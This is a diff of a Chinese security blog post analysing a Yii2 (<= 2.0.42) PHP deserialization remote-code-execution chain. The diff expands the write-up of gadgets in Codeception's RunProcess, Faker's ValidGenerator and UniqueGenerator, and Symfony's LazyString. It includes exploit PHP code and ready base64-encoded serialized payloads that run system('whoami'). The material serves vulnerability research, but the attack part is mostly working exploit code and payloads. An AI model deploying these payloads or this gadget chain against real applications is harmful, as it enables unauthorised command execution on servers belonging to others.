@@ -120,20 +120,20 @@
 
 
 
-<meta name="description" content="Yii2 &amp;lt;= 2.0.42 反序列化RCE">
+<meta name="description" content="Yii2 &amp;lt;= 2.0.42 研究Yii2最新的反序列化RCE，并参考作者思路挖掘新的Gadget">
 <meta name="keywords" content="漏洞分析">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Yii2最新反序列化POP链分析">
 <meta property="og:url" content="https://tyaoo.github.io/2021/06/03/Yii2最新反序列化POP链分析/index.html">
 <meta property="og:site_name" content="Tyaoo&#39;s Blog">
-<meta property="og:description" content="Yii2 &amp;lt;= 2.0.42 反序列化RCE">
+<meta property="og:description" content="Yii2 &amp;lt;= 2.0.42 研究Yii2最新的反序列化RCE，并参考作者思路挖掘新的Gadget">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021060322487929d10c56f7483236a4.png">
 <meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202106040200d261d2fda84de853a1e7.png">
-<meta property="og:updated_time" content="2021-06-03T18:11:15.931Z">
+<meta property="og:updated_time" content="2021-06-04T03:15:58.784Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Yii2最新反序列化POP链分析">
-<meta name="twitter:description" content="Yii2 &amp;lt;= 2.0.42 反序列化RCE">
+<meta name="twitter:description" content="Yii2 &amp;lt;= 2.0.42 研究Yii2最新的反序列化RCE，并参考作者思路挖掘新的Gadget">
 <meta name="twitter:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021060322487929d10c56f7483236a4.png">
 
 
@@ -388,7 +388,7 @@
       
         <blockquote>
 <p>Yii2 &lt;= 2.0.42</p>
-<p>反序列化RCE</p>
+<p>研究Yii2最新的反序列化RCE，并参考作者思路挖掘新的Gadget</p>
 </blockquote>
 <a id="more"></a>
 
@@ -438,7 +438,7 @@ echo(base64_encode(serialize($exp)));
 # TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjE6e3M6NDM6IgBDb2RlY2VwdGlvblxFeHRlbnNpb25cUnVuUHJvY2VzcwBwcm9jZXNzZXMiO2E6MTp7aTowO086MjA6IkZha2VyXFZhbGlkR2VuZXJhdG9yIjozOntzOjEyOiIAKgBnZW5lcmF0b3IiO086MjI6IkZha2VyXERlZmF1bHRHZW5lcmF0b3IiOjE6e3M6MTA6IgAqAGRlZmF1bHQiO3M6Njoid2hvYW1pIjt9czoxMjoiACoAdmFsaWRhdG9yIjtzOjY6InN5c3RlbSI7czoxMzoiACoAbWF4UmV0cmllcyI7aTo5OTk5OTk5OTt9fX0=</code></pre>
 <img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021060322487929d10c56f7483236a4.png" alt="image-20210603224742097" style="zoom:67%;">
 
-<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>入口点在<code>vendor/codeception/codeception/ext/RunProcess.php</code>的<code>__destruct</code>方法中</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>入口点在<code>vendor/codeception/codeception/ext/RunProcess.php</code>的<code>__destruct</code>方法中，这个方法很早就有人用了，但是官方还没禁止其反序列化</p>
 <pre><code class="php">class RunProcess extends Extension
 {
     public function __destruct()
@@ -481,7 +481,9 @@ echo(base64_encode(serialize($exp)));
     {
         return $this-&gt;default; // 传入需要执行的命令
     }</code></pre>
-<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>Yii2的补丁大都是直接加一个<code>__wakeup()</code>禁止反序列化，即黑名单过滤，跟着作者的思路，自己也搜索了一下<code>__call()</code>，然后定位到下面的<code>UniqueGenerator</code>类，和上面用到的<code>ValidGenerator</code>类很相似</p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>Yii2的补丁大都是直接加一个<code>__wakeup()</code>方法抛出错误禁止反序列化，即黑名单过滤</p>
+<p>跟着作者的思路，全局搜一下<code>__destruct()</code>方法，能用的基本就只剩下上面那个<code>RunProcess</code>类了</p>
+<p>只能去搜一下<code>__call()</code>方法，然后发现了下面的<code>UniqueGenerator</code>类，和上面用到的<code>ValidGenerator</code>类很相似</p>
 <pre><code class="php">namespace Faker;
 class UniqueGenerator
 {
@@ -504,15 +506,42 @@ class UniqueGenerator
 
         return $res;
     }</code></pre>
-<p>可以用到之前就已经被挖掘出来的<code>LazyString</code>的Gadget</p>
+<p>搜索<code>__sleep()</code>方法，来到了熟悉的<code>LazyString</code>类，到这里的思路应该就是全局搜一下<code>call_user_func()</code>方法，看看有没有可控的触发函数，这里我们就直接使用去年就已经被挖出来的<code>LazyString Gadget</code>吧</p>
 <pre><code class="php">namespace Symfony\Component\String;
 class LazyString implements \Stringable, \JsonSerializable
 {
     public function __sleep(): array
     {
-        $this-&gt;__toString();
+        $this-&gt;__toString(); // 调用__toString()
 
         return [&#39;value&#39;];
+    }
+
+    public function __toString()
+    {
+        if (\is_string($this-&gt;value)) {
+            return $this-&gt;value;
+        }
+
+        try {
+            return $this-&gt;value = ($this-&gt;value)(); // 函数可控
+        } catch (\Throwable $e) {
+            if (\TypeError::class === \get_class($e) &amp;&amp; __FILE__ === $e-&gt;getFile()) {
+                $type = explode(&#39;, &#39;, $e-&gt;getMessage());
+                $type = substr(array_pop($type), 0, -\strlen(&#39; returned&#39;));
+                $r = new \ReflectionFunction($this-&gt;value);
+                $callback = $r-&gt;getStaticVariables()[&#39;callback&#39;];
+
+                $e = new \TypeError(sprintf(&#39;Return value of %s() passed to %s::fromCallable() must be of the type string, %s returned.&#39;, $callback, static::class, $type));
+            }
+
+            if (\PHP_VERSION_ID &lt; 70400) {
+                // leverage the ErrorHandler component with graceful fallback when it&#39;s not available
+                return trigger_error($e, \E_USER_ERROR);
+            }
+
+            throw $e;
+        }
     }</code></pre>
 <p>给出最后的exp</p>
 <pre><code class="php">&lt;?php
@@ -538,7 +567,8 @@ namespace Symfony\Component\String
             $this-&gt;value = [new indexAction(), &quot;run&quot;];
         }
     } 
-    class UnicodeString{
+    class UnicodeString
+    {
         function __construct()
         {
             $this-&gt;value = new LazyString();
@@ -589,6 +619,10 @@ namespace
 
 # TzozMjoiQ29kZWNlcHRpb25cRXh0ZW5zaW9uXFJ1blByb2Nlc3MiOjE6e3M6OToicHJvY2Vzc2VzIjthOjE6e2k6MDtPOjIxOiJGYWtlclxVbmlxdWVHZW5lcmF0b3IiOjI6e3M6OToiZ2VuZXJhdG9yIjtPOjIyOiJGYWtlclxEZWZhdWx0R2VuZXJhdG9yIjoxOntzOjc6ImRlZmF1bHQiO086MzU6IlN5bWZvbnlcQ29tcG9uZW50XFN0cmluZ1xMYXp5U3RyaW5nIjoxOntzOjU6InZhbHVlIjthOjI6e2k6MDtPOjIwOiJ5aWlccmVzdFxJbmRleEFjdGlvbiI6Mjp7czoyOiJpZCI7czo2OiJ3aG9hbWkiO3M6MTE6ImNoZWNrQWNjZXNzIjtzOjY6InN5c3RlbSI7fWk6MTtzOjM6InJ1biI7fX19czoxMDoibWF4UmV0cmllcyI7aTo5OTk5OTk5OTt9fX0=</code></pre>
 <img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202106040200d261d2fda84de853a1e7.png" alt="image-20210604020055359" style="zoom:67%;">
+
+
+
+
 
 
 
